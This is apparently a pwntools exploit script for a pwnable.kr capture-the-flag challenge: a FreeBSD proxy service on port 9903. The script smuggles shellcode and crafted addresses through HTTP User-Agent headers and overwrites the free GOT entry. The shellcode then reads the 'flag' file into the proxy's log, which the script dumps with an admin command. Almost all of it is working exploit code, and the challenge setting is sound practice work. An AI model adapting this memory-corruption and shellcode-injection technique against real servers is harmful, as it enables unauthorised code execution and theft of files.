from pwn import *
import requests
import time

context.update(os='freebsd', arch="i386")

proxy_server = "pwnable.kr"
proxy_port = 9903

LOG_HEAD = 0x804a190
FREE_GOT = 0x804a16c
STACK_ADDR =  0xbf6fafa8 #stack address in UA where shellcode is

shellcode = '''

    /* fix free GOT */
    mov ebx, 0x804a16c
    mov ecx, 0x8048a3e
    mov [ebx], ecx

    /* open flag file */
    mov ecx, 0
    push ecx
    push 0x67616c66
    mov ebx, esp
	push ecx
	push ecx
	push ebx
	mov	eax, 5
	push eax
	int	0x80
	add	esp, 20

    /* read flag file into log */
    mov ebx, 256
    push ebx
    mov edx, 0x804a190
    mov edx, [edx]
    add edx, 8
    mov ebx, edx
    push ebx
    push eax
	mov	eax, 3
	push eax
	int	0x80
	add	esp, 20
    ret

'''

sc = asm(shellcode)
pattern = "A"*(120) + p32(LOG_HEAD-0x80) + p32(STACK_ADDR-0x80)

dumplog = "admincmd_proxy_dump_log\r\n"
test = "myip.dnsdynamic.org"

def make_request(server, port=80, timeout=1):
    req = [
        "GET http://%s:%d/ HTTP/1.1" % (server, port),
        "User-Agent: MM"+p32(STACK_ADDR+8) + p32(FREE_GOT-0x80) + sc
    ]
    msg = "\r\n".join(req)

    p = remote(proxy_server, proxy_port)
    p.send(msg)
    resp = p.read(timeout=timeout)
    p.close()

    return resp

for i in range(32):
    make_request(test, 80)

make_request(pattern, 17492)
make_request("BBBB", i)

p = remote(proxy_server, proxy_port)
p.send(dumplog)
print p.read()
p.close()
